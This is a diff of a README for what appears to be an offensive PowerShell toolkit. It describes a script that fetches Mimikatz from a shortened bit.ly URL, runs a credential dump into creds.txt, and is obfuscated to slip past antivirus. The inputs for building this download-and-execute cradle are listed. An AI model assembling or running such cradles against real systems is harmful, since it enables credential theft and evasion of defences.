@@ -26,10 +26,10 @@ This will change the bahivor of most AV scanners. The file will be no longer det
 
 ## MiLoading.ps1
 
-Is a single command that can be run on powershell. It will pull a file from the internet containing Mimikatz and will execute it. The results will be printed into a txt file which will be opened by notepad. The commands was created by the Invoke-CradleCrafter (https://github.com/danielbohannon/Invoke-CradleCrafter). Another great tool to obfuscate the command and to execute Mimikatz on devices
+Is a single command that can be run on powershell. It will pull a file from the internet containing Mimikatz and will execute it. The results will be printed into a txt file which will be opened by notepad. The commands was created by the Invoke-CradleCrafter (https://github.com/danielbohannon/Invoke-CradleCrafter). Another great tool to obfuscate the command and to execute Mimikatz is Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation).
 
-<pre>
 INPUTS:
+<pre>
 Url: http://bit.ly/L3g1tCrad1e
 Path: Default_File_Path.ps1
 PostCradleCommand: Invoke-Mimikatz -DumpCr > creds.txt; notepad creds.txt
